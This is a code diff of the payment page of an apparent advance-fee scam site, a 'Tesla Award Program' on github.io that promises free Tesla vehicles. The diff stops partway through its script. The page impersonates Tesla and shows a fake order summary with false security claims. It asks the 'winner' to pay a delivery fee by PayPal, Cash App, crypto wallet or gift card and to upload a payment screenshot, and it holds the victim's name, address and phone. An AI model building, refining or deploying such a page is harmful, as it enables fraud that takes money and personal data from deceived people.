@@ -3,168 +3,701 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Complete Your Order — Tesla Award Program</title>
-  <meta name="description" content="Finalize your Tesla award delivery. Review and confirm your delivery details and complete your order for a brand new Tesla vehicle.">
+  <title>Payment Details — Tesla Award Program</title>
+  <meta name="description" content="Complete your payment for your Tesla vehicle delivery. View payment instructions, upload proof of payment, and finalize your order.">
   <meta name="robots" content="index, follow">
   <link rel="canonical" href="https://joshbond123.github.io/Tesla/payment.html">
-  <meta property="og:type" content="website"><meta property="og:url" content="https://joshbond123.github.io/Tesla/payment.html"><meta property="og:title" content="Complete Your Order — Tesla Award Program"><meta property="og:description" content="Finalize your Tesla award delivery. Review and confirm your delivery details and complete your order for a brand new Tesla vehicle."><meta property="og:image" content="https://joshbond123.github.io/Tesla/assets/tesla-award-logo.png"><meta property="og:image:width" content="512"><meta property="og:image:height" content="512"><meta property="og:site_name" content="Tesla Award Program"><meta property="og:locale" content="en_US"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://joshbond123.github.io/Tesla/payment.html"><meta name="twitter:title" content="Complete Your Order — Tesla Award Program"><meta name="twitter:description" content="Finalize your Tesla award delivery."><meta name="twitter:image" content="https://joshbond123.github.io/Tesla/assets/tesla-award-logo.png">
-  <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://unpkg.com"><link rel="dns-prefetch" href="https://puebwzumwqizgbmksrpq.supabase.co">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Payment Details — Tesla Award Program">
+  <meta property="og:description" content="Complete your payment for your Tesla vehicle delivery.">
+  <link rel="icon" type="image/svg+xml" href="assets/tesla-award-logo.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="css/style.css">
-  <link rel="icon" type="image/png" href="assets/tesla-award-logo.png">
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","name":"Tesla Award Program","url":"https://joshbond123.github.io/Tesla","logo":"https://joshbond123.github.io/Tesla/assets/tesla-award-logo.png","description":"Independent promotional award program offering free Tesla vehicles to winners worldwide.","sameAs":[]}</script>
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"Tesla Award Program","url":"https://joshbond123.github.io/Tesla","potentialAction":{"@type":"SearchAction","target":"https://joshbond123.github.io/Tesla/track.html?tracking={search_term_string}","query-input":"required name=search_term_string"}}</script>
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://joshbond123.github.io/Tesla/"},{"@type":"ListItem","position":2,"name":"Payment","item":"https://joshbond123.github.io/Tesla/payment.html"}]}</script>
   <style>
-    body{background:#f5f5f7;}
-    .page-wrap{max-width:760px;margin:0 auto;padding:88px 24px 64px;}
-    .page-card{background:white;border-radius:24px;box-shadow:0 4px 24px rgba(0,0,0,0.06);border:1px solid rgba(0,0,0,0.06);padding:48px;}
-    @media(max-width:560px){.page-card{padding:28px 20px;border-radius:18px;}}
-    .page-title{font-size:28px;font-weight:900;color:#111;text-align:center;margin-bottom:6px;letter-spacing:-0.5px;}
-    .page-sub{font-size:15px;color:#666;text-align:center;line-height:1.65;margin-bottom:36px;}
-    .summary-section{background:#f8f9fa;border-radius:18px;padding:28px 32px;margin-bottom:28px;border:1px solid rgba(0,0,0,.04);}
-    .summary-section h3{font-size:14px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#888;margin-bottom:18px;}
-    .summary-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px 24px;}
-    @media(max-width:560px){.summary-grid{grid-template-columns:1fr;}}
-    .summary-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid rgba(0,0,0,.05);font-size:14px;}
+    :root {
+      --success: #00A550;
+      --warning: #F59E0B;
+      --danger: #EF4444;
+      --info: #3B82F6;
+      --pay-border: #E5E7EB;
+      --pay-radius: 16px;
+      --pay-shadow: 0 4px 12px rgba(0,0,0,0.07);
+      --pay-shadow-lg: 0 12px 40px rgba(0,0,0,0.1);
+    }
+    * { box-sizing: border-box; }
+    body{background:#f5f5f7;font-family:'Inter',-apple-system,sans-serif;color:#171A20;}
+
+    .page-wrap{max-width:820px;margin:0 auto;padding:88px 24px 64px;}
+    .page-card{background:white;border-radius:var(--pay-radius);box-shadow:var(--pay-shadow);border:1px solid var(--pay-border);padding:48px;}
+    @media(max-width:560px){.page-card{padding:24px 16px;border-radius:14px;}}
+
+    .page-title{font-size:28px;font-weight:900;color:#111;text-align:center;margin-bottom:4px;letter-spacing:-0.5px;}
+    .page-sub{font-size:15px;color:#666;text-align:center;line-height:1.65;margin-bottom:32px;}
+
+    /* Steps indicator */
+    .steps-bar{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:36px;flex-wrap:wrap;}
+    .s-step{display:flex;align-items:center;gap:6px;font-size:12px;font-weight:600;color:#999;}
+    .s-step.done{color:var(--success);}
+    .s-step.active{color:#E31937;}
+    .s-circle{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;background:#eee;color:#999;}
+    .s-step.done .s-circle{background:var(--success);color:#fff;}
+    .s-step.active .s-circle{background:#E31937;color:#fff;}
+    .s-line{width:32px;height:2px;background:#eee;flex-shrink:0;}
+    .s-line.done{background:var(--success);}
+
+    /* Order Summary */
+    .summary-section{background:#f8f9fa;border-radius:14px;padding:24px 28px;margin-bottom:24px;border:1px solid rgba(0,0,0,.04);}
+    .summary-section h3{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#888;margin-bottom:16px;}
+    .summary-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid rgba(0,0,0,.04);font-size:14px;}
     .summary-row:last-child{border-bottom:none;}
     .s-label{color:#777;}.s-value{color:#111;font-weight:600;text-align:right;}
-    .s-value.free{color:#00A550;font-weight:700;}
-    .s-total{padding-top:14px;margin-top:4px;border-top:2px solid #ddd;}
+    .s-total{border-top:2px solid #ddd;padding-top:12px;margin-top:4px;}
     .s-total .s-label{font-weight:700;color:#111;font-size:15px;}
-    .s-total .s-value{font-weight:900;color:#E31937;font-size:20px;}
-    .car-mini{display:flex;align-items:center;gap:14px;padding:16px 20px;background:#fff;border-radius:14px;border:1px solid rgba(0,0,0,.05);margin-bottom:20px;}
-    .car-mini img{height:50px;object-fit:contain;}
-    .car-mini .cm-name{font-size:16px;font-weight:800;color:#111;}
-    .car-mini .cm-price{font-size:13px;color:#777;}
-    .pay-card{border-radius:16px;border:2px solid #e5e5e5;padding:22px 24px;cursor:pointer;transition:all .3s cubic-bezier(.4,0,.2,1);margin-bottom:14px;display:flex;align-items:center;gap:18px;position:relative;overflow:hidden;}
-    .pay-card:hover{border-color:rgba(227,25,55,.35);box-shadow:0 6px 20px rgba(0,0,0,.06);transform:translateY(-2px);}
-    .pay-card.selected{border-color:#E31937;box-shadow:0 0 0 3px rgba(227,25,55,.12);}
-    .pay-logo{width:52px;height:52px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:26px;flex-shrink:0;}
-    .pay-info{flex:1;}.pay-name{font-size:16px;font-weight:700;color:#111;margin-bottom:2px;}.pay-desc{font-size:13px;color:#888;}
-    .pay-check{width:26px;height:26px;border-radius:50%;border:2px solid #ddd;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;transition:all .3s;flex-shrink:0;}
-    .pay-card.selected .pay-check{background:#E31937;border-color:#E31937;color:white;}
+    .s-total .s-value{font-weight:900;color:#E31937;font-size:22px;}
+
+    /* Selected Payment Method Detail */
+    .pay-detail-card{
+      background:white;border-radius:14px;border:1.5px solid rgba(227,25,55,.15);padding:24px;
+      margin-bottom:24px;box-shadow:0 2px 12px rgba(227,25,55,.06);
+    }
+    .pay-detail-header{display:flex;align-items:center;gap:14px;margin-bottom:16px;}
+    .pay-big-icon{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:28px;}
+    .pay-big-icon.wallet{background:rgba(0,48,135,.1);}.pay-big-icon.crypto{background:rgba(247,147,26,.1);}.pay-big-icon.card{background:rgba(59,130,246,.1);}.pay-big-icon.gift{background:rgba(239,68,68,.1);}
+    .pay-detail-title{font-size:18px;font-weight:800;color:#111;}
+    .pay-detail-sub{font-size:12px;color:#888;}
+
+    .wallet-address-box{
+      background:#f8f9fa;border:1px solid var(--pay-border);border-radius:12px;
+      padding:16px;display:flex;align-items:center;gap:12px;margin-bottom:16px;
+      word-break:break-all;font-family:'Courier New',monospace;font-size:13px;color:#333;
+    }
+    .wallet-address-box .copy-btn{
+      flex-shrink:0;background:#E31937;color:white;border:none;border-radius:8px;
+      padding:8px 16px;font-size:12px;font-weight:700;cursor:pointer;transition:all .2s;
+      white-space:nowrap;font-family:inherit;
+    }
+    .wallet-address-box .copy-btn:hover{background:#c41030;}
+    .wallet-address-box .copy-btn.copied{background:var(--success);}
+
+    .qr-placeholder{
+      width:160px;height:160px;background:#f8f9fa;border-radius:12px;
+      display:flex;align-items:center;justify-content:center;
+      margin:0 auto 16px;border:2px dashed var(--pay-border);
+      font-size:48px;color:#ccc;
+    }
+    .qr-placeholder img{width:100%;height:100%;object-fit:contain;border-radius:10px;}
+
+    .instructions-box{
+      background:#FFF8F0;border:1px solid rgba(245,158,11,.2);border-radius:12px;
+      padding:16px 20px;font-size:14px;color:#92400E;line-height:1.7;margin-bottom:16px;
+    }
+    .instructions-box strong{color:#111;}
+
+    /* Payment Proof Upload */
+    .upload-area{
+      border:2px dashed var(--pay-border);border-radius:14px;padding:32px;
+      text-align:center;cursor:pointer;transition:all .25s;margin-bottom:20px;
+      background:#FAFBFC;
+    }
+    .upload-area:hover{border-color:#E31937;background:rgba(227,25,55,.03);}
+    .upload-area.dragover{border-color:#E31937;background:rgba(227,25,55,.06);}
+    .upload-area.has-file{border-color:var(--success);background:rgba(0,165,80,.04);}
+    .upload-icon{font-size:48px;margin-bottom:12px;opacity:.5;}
+    .upload-title{font-size:16px;font-weight:700;color:#111;margin-bottom:4px;}
+    .upload-hint{font-size:13px;color:#888;margin-bottom:16px;}
+    .upload-actions{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;}
+    .upload-btn{
+      display:inline-flex;align-items:center;gap:8px;padding:10px 22px;
+      border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;
+      border:1.5px solid var(--pay-border);background:white;color:#555;
+      transition:all .2s;font-family:inherit;
+    }
+    .upload-btn:hover{border-color:#E31937;color:#E31937;background:rgba(227,25,55,.04);}
+    .upload-btn.primary{background:#E31937;color:white;border-color:#E31937;}
+    .upload-btn.primary:hover{background:#c41030;}
+    .upload-preview{display:none;margin-top:16px;}
+    .upload-preview.show{display:block;}
+    .upload-preview img{max-width:100%;max-height:200px;border-radius:10px;box-shadow:0 2px 12px rgba(0,0,0,.1);}
+    .upload-preview .file-name{font-size:13px;color:#555;margin-top:8px;font-weight:600;}
+    .upload-preview .file-size{font-size:11px;color:#999;}
+
+    /* Other payment methods */
+    .other-methods{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-bottom:24px;}
+    .other-method-card{
+      background:white;border:1.5px solid var(--pay-border);border-radius:12px;
+      padding:14px;text-align:center;cursor:pointer;transition:all .2s;
+    }
+    .other-method-card:hover{border-color:rgba(227,25,55,.3);transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.06);}
+    .other-method-card.selected{border-color:#E31937;background:rgba(227,25,55,.04);}
+    .other-method-card .om-icon{font-size:28px;margin-bottom:6px;}
+    .other-method-card .om-name{font-size:13px;font-weight:700;color:#111;}
+    .other-method-card .om-badge{
+      display:inline-block;font-size:9px;font-weight:700;padding:2px 6px;
+      border-radius:999px;margin-top:4px;
+    }
+    .other-method-card .om-badge.selected-badge{background:#E31937;color:#fff;}
+    .other-method-card .om-badge.disabled-badge{background:#eee;color:#999;}
+
+    /* Notification toggle for admin */
+    .notif-bar{
+      display:flex;align-items:center;justify-content:space-between;
+      background:#f0f7ff;border:1px solid rgba(59,130,246,.15);border-radius:12px;
+      padding:14px 18px;margin-bottom:20px;
+    }
+    .notif-bar .notif-text{font-size:13px;color:var(--info);font-weight:600;}
+    .notif-bar .notif-btn{
+      background:var(--info);color:white;border:none;border-radius:8px;
+      padding:8px 16px;font-size:12px;font-weight:700;cursor:pointer;
+      transition:all .2s;font-family:inherit;
+    }
+    .notif-bar .notif-btn:hover{background:#2563EB;}
+    .notif-bar .notif-btn.subscribed{background:var(--success);}
+
     .security-row{display:flex;align-items:center;gap:8px;justify-content:center;margin-top:20px;font-size:12px;color:#999;}
-    .whatsapp-float{position:fixed;bottom:28px;right:28px;z-index:99999;display:flex;flex-direction:column;align-items:center;gap:10px;}
-    .whatsapp-float .whatsapp-label{background:white;color:#171a20;font-size:12px;font-weight:600;padding:7px 12px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.1);white-space:nowrap;text-align:center;line-height:1.3;}
-    .whatsapp-float-btn{width:54px;height:54px;background:#25D366;border-radius:16px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(37,211,102,0.3);transition:transform 0.25s ease,box-shadow 0.25s ease;text-decoration:none;cursor:pointer;}
-    .whatsapp-float-btn:hover{transform:scale(1.06);box-shadow:0 6px 24px rgba(37,211,102,0.45);}
-    .whatsapp-float-btn svg{width:28px;height:28px;}
-    @media(max-width:600px){.whatsapp-float{right:16px;}.whatsapp-float-btn{width:48px;height:48px;border-radius:14px;}.whatsapp-float-btn svg{width:24px;height:24px;}.whatsapp-float .whatsapp-label{font-size:11px;padding:6px 10px;}}
+
+    @media(max-width:560px){
+      .page-title{font-size:22px;}.page-sub{font-size:14px;}
+      .wallet-address-box{flex-direction:column;align-items:stretch;}
+      .upload-actions{flex-direction:column;align-items:stretch;}
+      .other-methods{grid-template-columns:repeat(2,1fr);}
+      .steps-bar{gap:4px;}.s-line{width:16px;}
+    }
+
+    /* Modal */
+    .modal-overlay{position:fixed;inset:0;z-index:99998;background:rgba(23,26,32,.6);display:flex;align-items:center;justify-content:center;animation:fadeIn .15s ease;backdrop-filter:blur(4px);padding:20px;}
+    .modal-card{background:white;border-radius:18px;box-shadow:0 24px 80px rgba(0,0,0,.2);padding:32px 28px;max-width:440px;width:100%;animation:modalIn .2s ease;text-align:center;}
+    .modal-card h3{font-size:18px;font-weight:800;color:#111;margin:0 0 6px;}
+    .modal-card p{font-size:14px;color:#666;margin:0 0 20px;line-height:1.6;}
+    .modal-card .btn{min-width:120px;}
+    .modal-actions{display:flex;gap:10px;justify-content:center;}
+
+    @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+    @keyframes modalIn{from{opacity:0;transform:scale(.95) translateY(10px);}to{opacity:1;transform:scale(1) translateY(0);}}
+    @keyframes slideInUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+
+    .btn{display:inline-flex;align-items:center;gap:6px;justify-content:center;font-family:inherit;border:none;cursor:pointer;font-weight:600;transition:all .22s ease;border-radius:10px;font-size:14px;padding:12px 24px;white-space:nowrap;}
+    .btn-primary{background:#E31937;color:white;}.btn-primary:hover{background:#b5102a;box-shadow:0 8px 28px rgba(227,25,55,.32);}
+    .btn-ghost{background:transparent;color:#555;border:1.5px solid var(--pay-border);}.btn-ghost:hover{background:rgba(0,0,0,.03);border-color:#999;}
+    .btn-success{background:var(--success);color:white;}
+    .btn-danger{background:var(--danger);color:white;}
+    .btn-full{width:100%;}
+    .btn-lg{padding:14px 32px;font-size:16px;}
+    .btn-sm{font-size:12px;padding:8px 16px;}
+    .btn:disabled{opacity:.5;cursor:not-allowed;}
   </style>
 </head>
 <body>
-<nav class="nav"><div class="nav-inner"><a href="index.html" class="nav-logo"><img src="assets/tesla-award-logo.png" alt="Tesla Award Program" style="height:30px;width:auto;vertical-align:middle" loading="lazy" decoding="async"> TESLA</a><a href="delivery-method.html" class="btn btn-ghost" style="font-size:14px;">← Back</a></div></nav>
 
-<div class="page-wrap"><div class="page-card anim-fade-up">
-<h1 class="page-title">💳 Complete Your Order</h1>
-<p class="page-sub">Review your order and select a payment method to finalise delivery.</p>
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="var(--red)"><path d="M0 128C189 44 406 0 640 0s451 44 640 128l-38 74C1054 123 851 80 640 80S226 123 38 202L0 128Z"/><path d="M57 235c156-68 353-109 583-109s427 41 583 109c-44 58-102 101-174 130-9-38-25-68-48-90-55-51-159-76-312-76h-51L640 1280 459 199h-51c-153 0-257 25-312 76-23 22-39 52-48 90-72-29-130-72-174-130Z"/></svg>
+      TESLA
+    </a>
+    <div style="display:flex;align-items:center;gap:12px;">
+      <span style="font-size:12px;color:#888;">Step 4 of 4</span>
+      <a href="delivery-method.html" class="btn btn-ghost btn-sm">← Back</a>
+    </div>
+  </div>
+</nav>
 
-<div class="car-mini"><img src="" alt="" id="carMiniImg" onerror="this.style.display='none'" loading="lazy" decoding="async"><div><div class="cm-name" id="carMiniName">Tesla —</div><div class="cm-price" id="carMiniPrice">—</div></div><span style="margin-left:auto;font-size:12px;font-weight:800;background:#00A550;color:#fff;padding:4px 10px;border-radius:6px;">FREE</span></div>
+<div class="page-wrap">
+  <div class="page-card anim-fade-up">
 
-<div class="summary-section"><h3>📋 Order Summary</h3>
-<div class="summary-grid">
-<div class="summary-row"><span class="s-label">Tesla Model</span><span class="s-value" id="smModel">—</span></div>
-<div class="summary-row"><span class="s-label">Vehicle Value</span><span class="s-value free">FREE</span></div>
-<div class="summary-row"><span class="s-label">Delivery Method</span><span class="s-value" id="smMethod">—</span></div>
-<div class="summary-row"><span class="s-label">Delivery Time</span><span class="s-value" id="smTime">—</span></div>
-<div class="summary-row"><span class="s-label">Customer</span><span class="s-value" id="smName">—</span></div>
-<div class="summary-row"><span class="s-label">Address</span><span class="s-value" id="smAddr" style="font-size:13px;">—</span></div>
-<div class="summary-row"><span class="s-label">City</span><span class="s-value" id="smCity">—</span></div>
-<div class="summary-row"><span class="s-label">Country</span><span class="s-value" id="smCountry">—</span></div>
-<div class="summary-row"><span class="s-label">Phone</span><span class="s-value" id="smPhone">—</span></div>
-<div class="summary-row s-total"><span class="s-label">Total Delivery Fee</span><span class="s-value" id="smTotal">—</span></div>
-</div></div>
+    <!-- Steps -->
+    <div class="steps-bar">
+      <div class="s-step done"><span class="s-circle">✓</span> Select Car</div>
+      <div class="s-line done"></div>
+      <div class="s-step done"><span class="s-circle">✓</span> Delivery</div>
+      <div class="s-line done"></div>
+      <div class="s-step done"><span class="s-circle">✓</span> Method</div>
+      <div class="s-line done"></div>
+      <div class="s-step active"><span class="s-circle">4</span> Payment</div>
+    </div>
 
-<div style="margin-bottom:12px;font-size:14px;font-weight:700;color:#111;text-transform:uppercase;letter-spacing:.05em;">Select Payment Method</div>
-<div id="paymentMethodsContainer"></div>
+    <h1 class="page-title">💳 Complete Payment</h1>
+    <p class="page-sub">Review your order, select a payment method, send the delivery fee, and upload your payment proof.</p>
 
-<button class="btn btn-primary btn-full btn-lg" id="payBtn" onclick="processPayment()" disabled style="opacity:.45;cursor:not-allowed;margin-top:8px;">🔒 Pay & Place Order</button>
-<div class="security-row"><svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>256-bit SSL Encryption · Secure & Verified Payment</div>
-</div></div>
+    <!-- Order Summary -->
+    <div class="summary-section">
+      <h3>📋 Order Summary</h3>
+      <div class="summary-row"><span class="s-label">Tesla Model</span><span class="s-value" id="smModel">—</span></div>
+      <div class="summary-row"><span class="s-label">Delivery Method</span><span class="s-value" id="smMethod">—</span></div>
+      <div class="summary-row"><span class="s-label">Delivery Time</span><span class="s-value" id="smTime">—</span></div>
+      <div class="summary-row"><span class="s-label">Customer</span><span class="s-value" id="smName">—</span></div>
+      <div class="summary-row"><span class="s-label">Address</span><span class="s-value" id="smAddr" style="font-size:13px;">—</span></div>
+      <div class="summary-row"><span class="s-label">Phone</span><span class="s-value" id="smPhone">—</span></div>
+      <div class="summary-row s-total"><span class="s-label">Delivery Fee Due</span><span class="s-value" id="smTotal">—</span></div>
+    </div>
+
+    <!-- Select Payment Method -->
+    <div style="margin-bottom:16px;">
+      <div style="font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:12px;">Select Payment Method</div>
+      <div class="other-methods" id="paymentMethodsList">
+        <div style="grid-column:1/-1;text-align:center;padding:20px;color:#999;">Loading payment methods...</div>
+      </div>
+    </div>
+
+    <!-- Payment Method Details -->
+    <div id="paymentDetailSection" style="display:none;">
+      <div class="pay-detail-card">
+        <div class="pay-detail-header">
+          <div class="pay-big-icon wallet" id="pmBigIcon">💳</div>
+          <div>
+            <div class="pay-detail-title" id="pmDetailTitle">Payment Method</div>
+            <div class="pay-detail-sub" id="pmDetailType">Wallet</div>
+          </div>
+        </div>
+
+        <div id="walletAddressBox" style="display:none;">
+          <div style="font-size:12px;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px;">Send Payment To</div>
+          <div class="wallet-address-box">
+            <span id="walletAddress" style="flex:1;">—</span>
+            <button class="copy-btn" id="copyAddressBtn" onclick="copyAddress()">📋 Copy</button>
+          </div>
+        </div>
+
+        <div id="qrContainer" style="display:none;">
+          <div class="qr-placeholder" id="qrPlaceholder">
+            <span id="qrEmoji">📱</span>
+          </div>
+          <div style="text-align:center;margin-bottom:16px;">
+            <div id="qrNote" style="font-size:12px;color:#888;">Scan QR code with your payment app</div>
+          </div>
+        </div>
+
+        <div class="instructions-box" id="instructionsBox">
+          <strong>📌 Payment Instructions:</strong><br>
+          <span id="paymentInstructions">Send the exact delivery fee amount to the provided address. Include your Order ID (shown below) in the payment reference so we can match your payment.</span>
+        </div>
+
+        <div style="background:rgba(227,25,55,.04);border:1px solid rgba(227,25,55,.1);border-radius:10px;padding:12px 16px;font-size:12px;color:#E31937;text-align:center;">
+          ⚡ After sending payment, upload your payment proof below using the file upload or camera option.
+        </div>
+      </div>
+
+      <!-- Upload Payment Proof -->
+      <div style="font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:12px;">📎 Upload Payment Proof</div>
+
+      <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileInput').click()">
+        <div id="uploadState">
+          <div class="upload-icon" id="uploadIcon">📤</div>
+          <div class="upload-title" id="uploadTitle">Upload Payment Receipt</div>
+          <div class="upload-hint" id="uploadHint">Upload a screenshot or photo of your payment confirmation</div>
+          <div class="upload-actions">
+            <button class="upload-btn" onclick="event.stopPropagation();openCamera()">📷 Take Photo</button>
+            <button class="upload-btn primary" onclick="event.stopPropagation();document.getElementById('fileInput').click()">📁 Browse Files</button>
+          </div>
+        </div>
+        <div class="upload-preview" id="uploadPreview">
+          <img id="previewImage" src="" alt="Payment proof preview">
+          <div class="file-name" id="previewFileName"></div>
+          <div class="file-size" id="previewFileSize"></div>
+          <div style="margin-top:12px;display:flex;gap:10px;justify-content:center;">
+            <button class="btn btn-success btn-sm" id="confirmUploadBtn" onclick="confirmUpload()">✓ Confirm & Submit</button>
+            <button class="btn btn-ghost btn-sm" onclick="resetUpload()">Remove</button>
+          </div>
+        </div>
+      </div>
+
+      <input type="file" id="fileInput" accept="image/*" style="display:none" onchange="handleFileSelect(this)">
+      <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none" onchange="handleFileSelect(this)">
+
+      <div id="uploadStatus" style="display:none;padding:14px;border-radius:10px;margin-bottom:20px;font-size:14px;font-weight:600;text-align:center;"></div>
+
+      <button class="btn btn-primary btn-full btn-lg" id="submitBtn" disabled style="opacity:.5;cursor:not-allowed;" onclick="submitPayment()">
+        🔒 Confirm & Complete Order
+      </button>
+
+      <div class="security-row">
+        <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+        256-bit SSL Encryption · Your payment proof is securely uploaded
+      </div>
+    </div>
+
+  </div>
+</div>
 
 <script src="js/config.js"></script>
 <script src="js/app.js"></script>
 <script>
-(function(){"use strict";
-var S='https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/';
-var V={cybertruck:{id:'cybertruck',name:'Cybertruck',price:'$71,985',img:S+'cybertruck-main.png'},modely:{id:'modely',name:'Model Y',price:'$41,380',img:S+'modely-main.png'},models:{id:'models',name:'Model S',price:'$111,380',img:S+'models-main.png'},model3:{id:'model3',name:'Model 3',price:'$38,380',img:S+'model3-main.png'},modelx:{id:'modelx',name:'Model X',price:'$116,380',img:S+'modelx-main.png'}};
-var sc=JSON.parse(localStorage.getItem('tesla_selected_car')||'null');
-var sd=JSON.parse(localStorage.getItem('tesla_delivery_details')||'null');
-var sm=JSON.parse(localStorage.getItem('tesla_delivery_method')||'null');
-var st=localStorage.getItem('tesla_session_token')||(typeof getSession==='function'?getSession():'');
-if(!sc||!sd||!sm){window.location.href='dashboard.html';return;}
+(function() {
+  'use strict';
 
-// Load payment methods from admin settings
-var paymentMethods=[];
-try{var d=JSON.parse(localStorage.getItem('tesla_payment_methods')||'null');if(d&&Array.isArray(d)&&d.length>0){paymentMethods=d;}else{paymentMethods=[{id:'paypal',name:'PayPal',account:'PayPal account',instructions:'Send payment via PayPal',icon:'',enabled:true},{id:'cashapp',name:'Cash App',account:'$cashtag',instructions:'Send payment via Cash App',icon:'',enabled:true},{id:'crypto',name:'Cryptocurrency',account:'Wallet address',instructions:'Send crypto',icon:'',enabled:true}];}}catch(e){paymentMethods=[{id:'paypal',name:'PayPal',account:'',instructions:'',icon:'',enabled:true},{id:'cashapp',name:'Cash App',account:'',instructions:'',icon:'',enabled:true},{id:'crypto',name:'Cryptocurrency',account:'',instructions:'',icon:'',enabled:true}];}
+  // ── LOAD ORDER DATA ──
+  var selectedCar = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');
+  var deliveryDetails = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
+  var deliveryMethod = JSON.parse(localStorage.getItem('tesla_delivery_method') || 'null');
+  var sessionToken = localStorage.getItem('tesla_session_token') || (typeof getSession === 'function' ? getSession() : '');
 
-// Render only enabled payment methods
-var enabledMethods=paymentMethods.filter(function(m){return m.enabled!==false});
-var container=document.getElementById('paymentMethodsContainer');
-var logoColors={'paypal':'background:#003087;','cashapp':'background:#00D632;','crypto':'background:linear-gradient(135deg,#F7931A,#FFBA00);','creditcard':'background:linear-gradient(135deg,#1a1f71,#2563eb);','applegift':'background:linear-gradient(135deg,#555,#999);'};
-container.innerHTML=enabledMethods.map(function(m){var ls=logoColors[m.id]||'background:#555;';return'<div class="pay-card" id="pay-'+m.id+'" onclick="selectPayment(\''+m.id+'\')"><div class="pay-logo" style="'+ls+'">'+(m.icon||'💳')+'</div><div class="pay-info"><div class="pay-name">'+m.name+'</div><div class="pay-desc">'+m.instructions+'</div></div><div class="pay-check" id="pcheck-'+m.id+'">✓</div></div>';}).join('');
+  if (!selectedCar || !deliveryDetails || !deliveryMethod) {
+    window.location.href = 'dashboard.html';
+    return;
+  }
 
-document.getElementById('smModel').textContent=sc?'Tesla '+(sc.name||''):'\u2014';
-document.getElementById('smMethod').textContent=sm?sm.name:'\u2014';
-document.getElementById('smTime').textContent=sm?sm.days:'\u2014';
-document.getElementById('smName').textContent=sd?(sd.fullName||'\u2014'):'\u2014';
-document.getElementById('smAddr').textContent=sd?(sd.address||'\u2014'):'\u2014';
-document.getElementById('smCity').textContent=sd?(sd.city||'\u2014'):'\u2014';
-document.getElementById('smCountry').textContent=sd?(sd.country||'\u2014'):'\u2014';
-document.getElementById('smPhone').textContent=sd?(sd.phone||'\u2014'):'\u2014';
-document.getElementById('smTotal').textContent=sm?sm.priceDisplay:'\u2014';
-document.getElementById('carMiniName').textContent=sc?'Tesla '+(sc.name||''):'\u2014';
-document.getElementById('carMiniPrice').textContent=sc?(sc.price||''):'\u2014';
-var vi=V[sc.id]||null;
-var im=document.getElementById('carMiniImg');
-if(vi&&vi.img){im.src=vi.img;im.style.display='';}
-else if(sc.img){im.src=sc.img;im.style.display='';}
+  // ── PAYMENT METHODS ──
+  var paymentMethods = [];
+  var selectedPaymentId = null;
+  var uploadedFileData = null;
+  var uploadedFileName = '';
 
-var sp=null;
-window.selectPayment=function(m){
-  sp=m;
-  document.querySelectorAll('.pay-card').forEach(function(e){e.classList.remove('selected');});
-  var card=document.getElementById('pay-'+m);
-  if(card)card.classList.add('selected');
-  var b=document.getElementById('payBtn');
-  b.disabled=false;b.style.opacity='1';b.style.cursor='pointer';
-  b.textContent='Pay '+(sm?sm.priceDisplay:'')+' \u2014 Place Order';
-};
+  function loadPaymentMethods() {
+    var saved = localStorage.getItem('tesla_payment_methods');
+    if (saved) {
+      try { paymentMethods = JSON.parse(saved); } catch(e) {}
+    }
+    // Fallback defaults
+    if (!paymentMethods || paymentMethods.length === 0) {
+      paymentMethods = [
